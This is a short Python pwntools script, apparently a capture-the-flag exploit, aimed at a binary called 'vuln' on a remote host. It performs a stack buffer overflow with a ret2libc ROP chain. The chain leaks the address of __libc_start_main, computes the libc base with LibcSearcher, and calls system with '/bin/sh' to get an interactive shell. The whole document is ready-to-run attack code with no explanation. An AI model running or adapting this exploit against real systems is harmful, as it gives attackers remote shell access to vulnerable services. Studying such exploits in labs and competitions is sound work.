from pwn import *
from LibcSearcher import LibcSearcher

elf = ELF("./vuln")
lokal = False
if lokal:
    s=elf.process()
else:
    s=remote("35.188.73.186", 1111)

pad = 264
pop_rdi = 0x0000000000401223
ret = 0x000000000040101a
libcstart = elf.got['__libc_start_main']
puts = elf.plt['puts']
main = elf.symbols['main']


p = 'A'*pad
p += p64(ret)
p += p64(pop_rdi)
p += p64(libcstart)
p += p64(puts)
p += p64(main)

s.sendline(p)
s.recvline()
s.recvline()

leaklibc = u64(s.recvline().strip("\n").ljust(8,"\x00"))
log.info("libc start main : {}".format(hex(leaklibc)))
libc = LibcSearcher('__libc_start_main', leaklibc)

libcbase = leaklibc - libc.dump('__libc_start_main')
log.info("Libc Base : {}".format(hex(libcbase)))
system_addr = libcbase + libc.dump('system')
log.info("System address : {}".format(hex(system_addr)))
binsh_addr = libcbase + libc.dump('str_bin_sh')
log.info("binsh address : {}".format(hex(binsh_addr)))

p = 'A'*pad
p += p64(pop_rdi)
p += p64(binsh_addr)
p += p64(system_addr)

s.sendline(p)

s.interactive()
